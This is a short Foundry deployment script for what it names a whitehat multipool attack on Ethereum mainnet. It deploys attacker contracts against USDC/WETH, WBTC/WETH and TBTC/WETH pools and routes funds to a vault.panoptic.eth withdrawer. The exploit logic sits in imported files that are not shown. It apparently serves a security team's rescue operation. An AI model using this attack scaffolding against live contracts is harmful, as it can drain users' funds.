// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import {USDC_WETH30bpsMainnetAttacker_Deployer, USDC_WETH30bpsMainnetAttacker} from "./attacker-contracts/Deployable_USDC_WETH30bpsMainnetAttacker.sol";
import {WBTC_WETH30bpsMainnetAttacker_Deployer, WBTC_WETH30bpsMainnetAttacker} from "./attacker-contracts/Deployable_WBTC_WETH30bpsMainnetAttacker.sol";
import {TBTC_WETH30bpsMainnetAttacker_Deployer, TBTC_WETH30bpsMainnetAttacker} from "./attacker-contracts/Deployable_TBTC_WETH30bpsMainnet.sol";
import {MultipoolMainnetAttacker} from "./attacker-contracts/MultipoolMainnetAttacker.sol";

contract ExecuteMainnetWhitehatMultipoolAttack is Script {
    MultipoolMainnetAttacker multipoolAttacker;
    USDC_WETH30bpsMainnetAttacker usdcWethAttacker;
    WBTC_WETH30bpsMainnetAttacker wbtcWethAttacker;
    TBTC_WETH30bpsMainnetAttacker tbtcWethAttacker;

    function run() public {
        uint256 DEPLOYER_PRIVATE_KEY = vm.envUint("DEPLOYER_PRIVATE_KEY");

        vm.startBroadcast(DEPLOYER_PRIVATE_KEY);

        // vault.panoptic.eth on mainnet
        address withdrawer = 0x82BF455e9ebd6a541EF10b683dE1edCaf05cE7A1;

        console.log("Executing the 4-pool attack:");
        multipoolAttacker = new MultipoolMainnetAttacker{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("MultipoolMainnetAttacker deployed at:", address(multipoolAttacker));
        console.log("MultipoolMainnetAttacker succeeded");
        usdcWethAttacker = multipoolAttacker.usdcWethAttacker();
        wbtcWethAttacker = multipoolAttacker.wbtcWethAttacker();
        /* tbtcWethAttacker = multipoolAttacker.tbtcWethAttacker(); */
        console.log("usdcWethAttacker deployed from the MultipoolMainnetAttacker deployed and holding funds at:", address(usdcWethAttacker));
        console.log("wbtcWethAttacker deployed from the MultipoolMainnetAttacker deployed and holding funds at:", address(wbtcWethAttacker));
        console.log("tbtcWethAttacker deployed from the MultipoolMainnetAttacker deployed and holding funds at:", address(tbtcWethAttacker));

        vm.stopBroadcast();
    }
}
